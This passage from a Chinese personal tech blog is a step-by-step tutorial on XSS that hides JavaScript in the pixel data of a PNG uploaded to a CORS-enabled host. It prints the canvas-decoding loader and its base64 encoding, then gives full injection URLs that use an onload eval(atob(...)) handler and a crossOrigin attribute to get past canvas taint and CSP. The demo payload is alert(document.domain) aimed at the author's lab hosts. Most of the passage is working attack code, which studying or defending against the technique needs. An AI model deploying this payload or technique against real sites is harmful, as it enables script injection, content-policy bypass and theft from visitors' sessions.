</span></span></code></pre></div><p>可以看出，我们输入的<code>wd</code>参数是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#34;&gt; &lt;img src=&#34;</span><span style=color:#a6e22e>xxx</span><span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#a6e22e>jsimg</span><span style=color:#e6db74>&#34; onload=&#34;&#34; /&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;a href=&#34;</span>
</span></span></code></pre></div><p>注释：</p><blockquote><ul><li>xxx 是恶意PNG图片的大型网站 URL；</li></ul></blockquote><ul><li>id 是注入的id属性；</li><li>onload 是要触发的事件；</li><li>a href= 是一个A标签，仅用于防止破坏HTML语法；</li></ul><p>所以，<code>wd</code>的值需构造为：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>wd</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#34;&gt; &lt;img src=&#34;</span><span style=color:#a6e22e>xxx</span><span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#a6e22e>jsimg</span><span style=color:#e6db74>&#34; onload=&#34;&#34; /&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;a href=&#34;</span>
</span></span></code></pre></div><h4 id=实现方式>实现方式</h4><p>根据以上构造及理论，我们恶意<code>PNG</code>图片文件中隐藏<code>JavaScript</code>代码，再用<code>onload</code>注入的<code>js</code>代码，还原恶意<code>PNG</code>图片文件里面的内容，就可以实现<code>xss</code>攻击了。</p><h4 id=恶意png图片>恶意PNG图片</h4><p>我们把代码中的<code>Hello, World!</code>换成我们的js脚本代码，如：<code>alert(document.domain)</code>,运行后另存为本地，并命名为<code>png.png</code>.</p><p>把<code>png.png</code>文件上传到大型网站，</p><blockquote><p>注意：这个传图的站点要支持跨域。</p></blockquote><p>判断方式，访问上传的图片，查看响应头是否有<code>Access-Control-Allow-Origin: *</code>，如下图：</p><p><img src=https://www.choudalao.com/uploads/20211001/20211001131857gAvJoT.png alt></p><p>作为演示，大型网站用我自己搭建的网站代替，上传后我的图片访问地址是<code>http://dev.pikachu.net/vul/unsafeupload/uploads/png.png</code>，</p><h4 id=onload的js代码>onload的js代码</h4><p>可以利用<code>img</code>标签的<code>onload="javascript:eval()</code>去触发事件，<code>window.btoa</code>用于编码base64，而<code>atob</code>用于解码base64，可以把我们图片还原代码先编码，注入onload时解码来执行js代码，所以我们构造<code>onload="javascript:eval(atob("加密的js代码"))"</code>进行攻击。</p><p>现在，我需要注入几行<code>JavaScript</code>代码把图片转换成一个外部的<code>JavaScript</code>库并绕过<code>CSP</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// 加密的js代码
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;jsimg&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>s</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>String</span><span style=color:#f92672>.</span><span style=color:#a6e22e>fromCharCode</span>, <span style=color:#a6e22e>c</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>createElement</span>(<span style=color:#e6db74>&#34;canvas&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>cs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>style</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>cx</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getContext</span>(<span style=color:#e6db74>&#34;2d&#34;</span>),
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>w</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>.</span><span style=color:#a6e22e>offsetWidth</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>h</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>.</span><span style=color:#a6e22e>offsetHeight</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>width</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>w</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>c</span><span style=color:#f92672>.</span><span style=color:#a6e22e>height</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>h</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>cs</span><span style=color:#f92672>.</span><span style=color:#a6e22e>width</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>w</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;px&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>cs</span><span style=color:#f92672>.</span><span style=color:#a6e22e>height</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>h</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;px&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>cx</span><span style=color:#f92672>.</span><span style=color:#a6e22e>drawImage</span>(<span style=color:#a6e22e>t</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>x</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>cx</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getImageData</span>(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>w</span>, <span style=color:#a6e22e>h</span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>data</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>l</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span><span style=color:#f92672>.</span><span style=color:#a6e22e>length</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>l</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>4</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0</span>]) <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>s</span>(<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]) <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>s</span>(<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>]) <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>s</span>(<span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>i</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>]);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>eval</span>(<span style=color:#a6e22e>a</span>)
</span></span></code></pre></div><p>用函数<code>window.btoa</code>加密成base64形式：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>str</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;t = document.getElementById(&#34;jsimg&#34;);var s = String.fromCharCode, c = document.createElement(&#34;canvas&#34;);var cs = c.style,cx = c.getContext(&#34;2d&#34;),w = t.offsetWidth,h = t.offsetHeight;c.width = w;c.height = h;cs.width = w + &#34;px&#34;;cs.height = h + &#34;px&#34;;cx.drawImage(t, 0, 0);var x = cx.getImageData(0, 0, w, h).data;var a = &#34;&#34;,l = x.length,p = -1;for (var i = 0; i &lt; l; i += 4) {if (x[i + 0]) a += s(x[i + 0]);if (x[i + 1]) a += s(x[i + 1]);if (x[i + 2]) a += s(x[i + 2]);}eval(a)&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>res</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>window</span><span style=color:#f92672>.</span><span style=color:#a6e22e>btoa</span>(<span style=color:#a6e22e>str</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span><span style=color:#f92672>.</span><span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>res</span>);
</span></span></code></pre></div><p>得到如下结果：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpO3ZhciBzID0gU3RyaW5nLmZyb21DaGFyQ29kZSwgYyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpO3ZhciBjcyA9IGMuc3R5bGUsY3ggPSBjLmdldENvbnRleHQoIjJkIiksdyA9IHQub2Zmc2V0V2lkdGgsaCA9IHQub2Zmc2V0SGVpZ2h0O2Mud2lkdGggPSB3O2MuaGVpZ2h0ID0gaDtjcy53aWR0aCA9IHcgKyAicHgiO2NzLmhlaWdodCA9IGggKyAicHgiO2N4LmRyYXdJbWFnZSh0LCAwLCAwKTt2YXIgeCA9IGN4LmdldEltYWdlRGF0YSgwLCAwLCB3LCBoKS5kYXRhO3ZhciBhID0gIiIsbCA9IHgubGVuZ3RoLHAgPSAtMTtmb3IgKHZhciBpID0gMDsgaSA8IGw7IGkgKz0gNCkge2lmICh4W2kgKyAwXSkgYSArPSBzKHhbaSArIDBdKTtpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7aWYgKHhbaSArIDJdKSBhICs9IHMoeFtpICsgMl0pO31ldmFsKGEp</span>
</span></span></code></pre></div><p>由上面的拼接可得，最终的<code>wd</code>参数为：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>wd</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#34;&gt; &lt;img src=&#34;</span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>dev</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pikachu</span><span style=color:#f92672>.</span><span style=color:#a6e22e>net</span><span style=color:#f92672>/</span><span style=color:#a6e22e>vul</span><span style=color:#f92672>/</span><span style=color:#a6e22e>unsafeupload</span><span style=color:#f92672>/</span><span style=color:#a6e22e>uploads</span><span style=color:#f92672>/</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#a6e22e>jsimg</span><span style=color:#e6db74>&#34; onload=&#39;javascript:eval(atob(&#34;</span><span style=color:#a6e22e>dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpO3ZhciBzID0gU3RyaW5nLmZyb21DaGFyQ29kZSwgYyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpO3ZhciBjcyA9IGMuc3R5bGUsY3ggPSBjLmdldENvbnRleHQoIjJkIiksdyA9IHQub2Zmc2V0V2lkdGgsaCA9IHQub2Zmc2V0SGVpZ2h0O2Mud2lkdGggPSB3O2MuaGVpZ2h0ID0gaDtjcy53aWR0aCA9IHcgKyAicHgiO2NzLmhlaWdodCA9IGggKyAicHgiO2N4LmRyYXdJbWFnZSh0LCAwLCAwKTt2YXIgeCA9IGN4LmdldEltYWdlRGF0YSgwLCAwLCB3LCBoKS5kYXRhO3ZhciBhID0gIiIsbCA9IHgubGVuZ3RoLHAgPSAtMTtmb3IgKHZhciBpID0gMDsgaSA8IGw7IGkgKz0gNCkge2lmICh4W2kgKyAwXSkgYSArPSBzKHhbaSArIDBdKTtpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7aWYgKHhbaSArIDJdKSBhICs9IHMoeFtpICsgMl0pO31ldmFsKGEp</span><span style=color:#e6db74>&#34;))&#39; /&gt;&lt;a href=&#34;</span>
</span></span></code></pre></div><p>访问<code>http://dev.host.net/png.php?wd=参数</code>：</p><h5 id=跨域问题>跨域问题</h5><p>如果出现如下报错：</p><blockquote><p>Uncaught DOMException: Failed to execute &lsquo;getImageData&rsquo; on &lsquo;CanvasRenderingContext2D&rsquo;: The canvas has been tainted by cross-origin data.</p></blockquote><p><img src=https://www.choudalao.com/uploads/20211001/20211001150800Bs1eVg.png alt></p><p>通过阅读文档，我的浏览器似乎故意在跨源加载图片时阻塞<code>getImageData</code>之类的方法。似乎我只需要注入<code>crossorigin</code>属性：</p><ol><li><p>HTML为图片提供了跨域属性，该图片与适当的CORS标头结合使用，允许元素定义的从外部来源加载的图片在&lt; img >元素定义的图像在&lt; canvas >中使用，就好像它们是从当前源加载的一样。</p></li><li><p>由于画布位图中的像素可能来自多种来源，包括从其他主机检索到的图片或视频，因此不可避免地会出现安全问题。一旦将任何未经CORS批准从其他来源加载的数据绘制到画布中，画布就会被污染。被污染的画布不再被认为是安全的，任何从画布中检索图片数据的尝试都会导致引发异常。如果外部内容的来源是HTML &lt; img >或SVG&lt; svg > 元素，则不允许尝试检索画布的内容。</p></li></ol><p>我们在刚才的参数中增加一个属性<code>crossOrigin="anonymous"</code>,最终访问地址如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>dev</span><span style=color:#f92672>.</span><span style=color:#a6e22e>host</span><span style=color:#f92672>.</span><span style=color:#a6e22e>net</span><span style=color:#f92672>/</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>wd</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#34;&gt; &lt;img src=&#34;</span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>dev</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pikachu</span><span style=color:#f92672>.</span><span style=color:#a6e22e>net</span><span style=color:#f92672>/</span><span style=color:#a6e22e>vul</span><span style=color:#f92672>/</span><span style=color:#a6e22e>unsafeupload</span><span style=color:#f92672>/</span><span style=color:#a6e22e>uploads</span><span style=color:#f92672>/</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#e6db74>&#34; crossOrigin=&#34;</span><span style=color:#a6e22e>anonymous</span><span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#a6e22e>jsimg</span><span style=color:#e6db74>&#34; onload=&#39;javascript:eval(atob(&#34;</span><span style=color:#a6e22e>dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpO3ZhciBzID0gU3RyaW5nLmZyb21DaGFyQ29kZSwgYyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpO3ZhciBjcyA9IGMuc3R5bGUsY3ggPSBjLmdldENvbnRleHQoIjJkIiksdyA9IHQub2Zmc2V0V2lkdGgsaCA9IHQub2Zmc2V0SGVpZ2h0O2Mud2lkdGggPSB3O2MuaGVpZ2h0ID0gaDtjcy53aWR0aCA9IHcgKyAicHgiO2NzLmhlaWdodCA9IGggKyAicHgiO2N4LmRyYXdJbWFnZSh0LCAwLCAwKTt2YXIgeCA9IGN4LmdldEltYWdlRGF0YSgwLCAwLCB3LCBoKS5kYXRhO3ZhciBhID0gIiIsbCA9IHgubGVuZ3RoLHAgPSAtMTtmb3IgKHZhciBpID0gMDsgaSA8IGw7IGkgKz0gNCkge2lmICh4W2kgKyAwXSkgYSArPSBzKHhbaSArIDBdKTtpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7aWYgKHhbaSArIDJdKSBhICs9IHMoeFtpICsgMl0pO31ldmFsKGEp</span><span style=color:#e6db74>&#34;))&#39; /&gt;&lt;a href=&#34;</span>
</span></span></code></pre></div><p>这里还要注意一个点是，恶意PNG图片要允许跨域<code>Access-Control-Allow-Origin：*</code>，我在本地nginx做了相应的处理，单独访问图片可以观察到<code>Access-Control-Allow-Origin：*</code>:</p><p><img src=https://www.choudalao.com/uploads/20211001/202110011244090ZPNtS.png alt></p><h3 id=访问效果>访问效果</h3><p><img src=https://www.choudalao.com/uploads/20211001/20211001150228I5Atwh.png alt></p></div></article></main></div><aside class=sidebar><div class="widget-categories widget"><h4 class=widget__title>分类</h4><div class=widget__content><ul class=widget__list><li class=widget__item><a class=widget__link href=/choudalao.github.io/categories/ai/>AI</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/categories/go/>Go</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/categories/linux/>Linux</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/categories/mysql/>MYSQL</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/categories/php/>Php</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/categories/python/>Python</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/categories/%E4%B8%AA%E4%BA%BA/>个人</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/categories/%E5%85%B6%E4%BB%96/>其他</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/categories/%E5%89%8D%E7%AB%AF/>前端</a></li></ul></div></div><div class="widget-recent widget"><h4 class=widget__title>近期文章</h4><div class=widget__content><ul class=widget__list><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2025-04-19-cline%E4%B8%AD%E4%BD%BF%E7%94%A8-mysql-mcp-%E6%9C%8D%E5%8A%A1/>Cline中使用 MySql MCP 服务</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2020-09-03-%E5%9F%BA%E4%BA%8Elaravel%E5%8F%8Alayui%E5%BC%80%E5%8F%91%E7%9A%84%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-laravel-wjfcms/>基于laravel及layui开发的后台管理系统 -- laravel-wjfcms</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2020-06-02-%E8%85%BE%E8%AE%AF%E4%BA%91%E4%BA%A7%E5%93%81%E5%A4%A7%E4%BF%83/>腾讯云产品大促</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2019-09-21-git%E6%93%8D%E4%BD%9C/>Git操作</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2026-01-29-openclaw-%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/>openclaw 安装及使用</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2026-01-28-mise-%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/>mise 安装及使用指南</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2026-01-26-%E7%94%A8-obsidian-%E6%89%93%E9%80%A0ai%E7%AC%94%E8%AE%B0/>用 Obsidian 打造AI笔记</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2026-01-22-claude-%E5%AE%98%E6%96%B9-skill-creator-%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/>Claude 官方 Skill-Creator 介绍及使用指南</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2026-01-22-%E9%80%9A%E8%BF%87qq%E9%82%AE%E7%AE%B1%E4%BB%A3%E6%94%B6gmail%E9%82%AE%E4%BB%B6/>通过QQ邮箱代收Gmail邮件</a></li><li class=widget__item><a class=widget__link href=/choudalao.github.io/posts/2026-01-19-%E8%A7%A3%E5%86%B3-wsl2-windows-hosts-%E5%BC%80%E5%90%AF-vpn-%E5%90%8E%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0-web-%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%97%AE%E9%A2%98/>解决 WSL2 + Windows Hosts + 开启 VPN 后无法访问本地 Web 服务的问题</a></li></ul></div></div><div class="widget-taglist widget"><h4 class=widget__title>标签</h4><div class=widget__content><a class="widget-taglist__link widget__link btn" href=/choudalao.github.io/tags/php/ title=Php>Php</a>
<a class="widget-taglist__link widget__link btn" href=/choudalao.github.io/tags/%E5%85%B3%E4%BA%8E/ title=关于>关于</a></div></div></aside></div><footer class=footer><div class="container footer__container flex"><div class=footer__copyright>&copy; 2026 臭大佬博客.
<span class=footer__copyright-credits>基于 <a href=https://gohugo.io/ rel="nofollow noopener" target=_blank>Hugo</a> 引擎和 <a href=https://github.com/Vimux/Mainroad/ rel="nofollow noopener" target=_blank>Mainroad</a> 主题</span></div></div></footer></div><script async defer src=/choudalao.github.io/js/menu.js></script></body></html>